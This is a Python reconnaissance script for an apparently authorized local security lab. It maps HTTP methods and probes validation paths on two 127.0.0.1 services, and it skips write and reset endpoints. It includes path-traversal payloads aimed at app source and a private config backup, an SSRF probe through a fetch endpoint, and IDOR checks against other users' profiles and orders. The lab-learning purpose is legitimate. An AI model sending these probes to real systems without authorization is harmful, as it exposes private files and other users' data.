# -*- coding: utf-8 -*-
"""阶段2 侦察：HTTP 方法矩阵 + 业务流程（只读/无副作用路径）。
硬约束：
- 仅 127.0.0.1；
- 不触发 /__reset、不做上传/发帖/转账/提现/改单等写操作；
- 只测「无副作用即返回」的入口，参数一律用无效值触发校验分支。
"""
import json
import time
import urllib.parse
import urllib.request
import http.cookiejar

UA = "recon-lab/1.0 (authorized-local-only)"
TS = time.strftime("%Y%m%d-%H%M%S")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj), NoRedirect), cj


def req(op, url, method="GET", data=None, headers=None):
    h = {"User-Agent": UA}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = urllib.parse.urlencode(data).encode()
        h["Content-Type"] = "application/x-www-form-urlencoded"
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=10)
        raw, code, hdrs = resp.read(), resp.status, dict(resp.headers)
    except urllib.error.HTTPError as e:
        raw, code, hdrs = e.read(), e.code, dict(e.headers)
    except Exception as e:
        return {"code": None, "err": f"{type(e).__name__}: {e}", "len": 0}
    return {"code": code, "len": len(raw), "location": hdrs.get("Location"),
            "allow": hdrs.get("Allow"), "ct": hdrs.get("Content-Type", ""),
            "head": raw.decode("utf-8", "replace")[:160]}


out = {"generated_at": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
       "note": "method matrix + no-side-effect business flow probes; write endpoints NOT executed",
       "results": {}}

# ---------- 8095 ----------
op, cj = opener()
lab = {}
for path in ["/", "/home", "/login", "/board", "/upload", "/admin/users", "/debug",
             "/wallet/withdraw", "/wallet/transfer", "/change-password", "/__reset"]:
    lab[path] = {}
    for m in ["GET", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH", "TRACE"]:
        if path == "/__reset" and m in ("GET", "POST", "PUT", "DELETE", "PATCH"):
            lab[path][m] = {"skipped": "有副作用（删库），未执行"}
            continue
        lab[path][m] = req(op, "http://127.0.0.1:8095" + path, m)
        time.sleep(0.12)

# 登录（demo）
op2, cj2 = opener()
lab["_login"] = req(op2, "http://127.0.0.1:8095/login", "POST",
                   {"username": "demo", "password": "demo123"})
lab["_token_cookie"] = {c.name: c.value for c in cj2}

# 认证态：无副作用校验分支
lab["auth_no_side_effect"] = {
    "/wallet/withdraw?amount=0": req(op2, "http://127.0.0.1:8095/wallet/withdraw?amount=0"),
    "/wallet/withdraw?amount=abc": req(op2, "http://127.0.0.1:8095/wallet/withdraw?amount=abc"),
    "/wallet/transfer?to=nobody&amount=0": req(op2, "http://127.0.0.1:8095/wallet/transfer?to=nobody&amount=0"),
    "/order/status?order_id=1&state=bogus": req(op2, "http://127.0.0.1:8095/order/status?order_id=1&state=bogus"),
    "/order/create?product_id=1&qty=0": req(op2, "http://127.0.0.1:8095/order/create?product_id=1&qty=0"),
    "/coupon/claim?code=NOPE": req(op2, "http://127.0.0.1:8095/coupon/claim?code=NOPE"),
    "/admin/users": req(op2, "http://127.0.0.1:8095/admin/users"),
    "/admin/orders": req(op2, "http://127.0.0.1:8095/admin/orders"),
    "/debug": req(op2, "http://127.0.0.1:8095/debug"),
    "/download?file=readme.txt": req(op2, "http://127.0.0.1:8095/download?file=readme.txt"),
    "/download?file=../app.py": req(op2, "http://127.0.0.1:8095/download?file=../app.py"),
    "/download?file=..%2fapp.py": req(op2, "http://127.0.0.1:8095/download?file=..%2fapp.py"),
    "/download?file=%2e%2e%2f%2e%2e%2fprivate%2fconfig.bak": req(op2, "http://127.0.0.1:8095/download?file=%2e%2e%2f%2e%2e%2fprivate%2fconfig.bak"),
    "/fetch?url=http://127.0.0.1:8095/": req(op2, "http://127.0.0.1:8095/fetch?url=http://127.0.0.1:8095/"),
    "/forgot?username=demo": req(op2, "http://127.0.0.1:8095/forgot?username=demo"),
}
lab["debug_as_demo"] = req(op2, "http://127.0.0.1:8095/debug")
out["results"]["127.0.0.1:8095"] = lab

# ---------- 8091 ----------
op3, cj3 = opener()
site = {}
for path in ["/", "/login", "/register", "/profile", "/api/profile", "/change-password"]:
    site[path] = {}
    for m in ["GET", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"]:
        site[path][m] = req(op3, "http://127.0.0.1:8091" + path, m)
        time.sleep(0.12)
site["_login_get"] = req(op3, "http://127.0.0.1:8091/login", "GET")
r = urllib.request.Request("http://127.0.0.1:8091/login", headers={"User-Agent": UA})
html = op3.open(r, timeout=10).read().decode("utf-8", "replace")
import re
m2 = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', html)
csrf = m2.group(1) if m2 else ""
site["_login_post"] = req(op3, "http://127.0.0.1:8091/login", "POST",
                          {"username": "demo", "password": "demo1234",
                           "csrf_token": csrf})
site["_auth_checks"] = {
    "/profile": req(op3, "http://127.0.0.1:8091/profile"),
    "/api/profile?id=1": req(op3, "http://127.0.0.1:8091/api/profile?id=1"),
    "/api/profile?id=3": req(op3, "http://127.0.0.1:8091/api/profile?id=3"),
    "/api/orders?id=1": req(op3, "http://127.0.0.1:8091/api/orders?id=1"),
    "/api/orders?id=3": req(op3, "http://127.0.0.1:8091/api/orders?id=3"),
}
out["results"]["127.0.0.1:8091"] = site

path_out = rf"C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\recon-12-methods-{TS}.json"
with open(path_out, "w", encoding="utf-8") as fh:
    json.dump(out, fh, ensure_ascii=False, indent=2)

summary = {}
for asset, data in out["results"].items():
    methods = {}
    for k, v in data.items():
        if k.startswith("_") or not isinstance(v, dict):
            continue
        if all(isinstance(x, dict) and "code" in x for x in v.values()):
            methods[k] = {mk: mv["code"] for mk, mv in v.items()}
    summary[asset] = methods
print(json.dumps({"out": path_out, "methods": summary,
                  "lab_login": out["results"]["127.0.0.1:8095"]["_login"],
                  "site_login": out["results"]["127.0.0.1:8091"]["_login_post"]},
                 ensure_ascii=False, indent=1))
